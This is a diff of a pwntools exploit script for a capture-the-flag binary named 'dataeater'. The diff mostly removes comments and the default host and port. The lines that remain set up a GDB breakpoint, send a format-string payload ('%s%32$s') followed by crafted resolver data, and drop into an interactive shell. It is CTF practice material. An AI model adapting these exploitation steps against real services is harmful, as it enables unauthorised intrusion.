@@ -1,23 +1,10 @@
 #!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-# This exploit template was generated via:
-# $ pwn template dataeater --host mc.ax --port 31869
 from pwn import *
 import os
 
-# Set up pwntools for the correct architecture
 exe = context.binary = ELF('dataeater')
 
-# Many built-in settings can be controlled on the command-line and show up
-# in "args".  For example, to dump all data sent/received, and disable ASLR
-# for all created processes...
-# ./exploit.py DEBUG NOASLR
-# ./exploit.py GDB HOST=example.com PORT=4141
-host = args.HOST or 'mc.ax'
-port = int(args.PORT or 31869)
-
 def start_local(argv=[], *a, **kw):
-    '''Execute the target binary locally'''
     if args.GDB:
         return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
     else:
@@ -37,9 +24,6 @@ def start(argv=[], *a, **kw):
     else:
         return start_remote(argv, *a, **kw)
 
-# Specify your GDB script here for debugging
-# GDB will be launched if the exploit is run via e.g.
-# ./exploit.py GDB
 gdbscript = '''
 #tbreak main
 tbreak *0x004006e6
@@ -211,6 +195,5 @@ check_whitespace(resolve_data)
 io = start()
 io.sendline(b"%s%32$s")
 io.sendline(buf_data+b' '+resolve_data+b' b\n')
-
 
 io.interactive()
